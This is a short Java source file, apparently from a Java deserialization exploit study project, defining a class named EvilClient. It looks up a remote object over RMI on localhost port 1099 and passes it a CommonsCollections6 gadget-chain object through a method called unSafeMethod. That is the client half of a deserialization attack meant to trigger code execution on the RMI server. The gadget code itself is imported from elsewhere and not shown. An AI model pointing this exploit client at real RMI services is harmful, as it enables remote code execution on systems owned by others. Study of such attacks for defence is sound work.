package com.yyjccc.jndi.RMI.exp.server;

import com.yyjccc.CommonsExp.Cc1;
import com.yyjccc.CommonsExp.Cc6;

import java.rmi.Naming;


public class EvilClient {
	public static void main(String[] args) {
		try {
			IRemote iRemote = (IRemote) Naming.lookup("rmi://127.0.0.1:1099/obj");
			iRemote.unSafeMethod(Cc6.cc6());
		} catch (Exception e) {
			throw new RuntimeException(e);
		}

	}
}
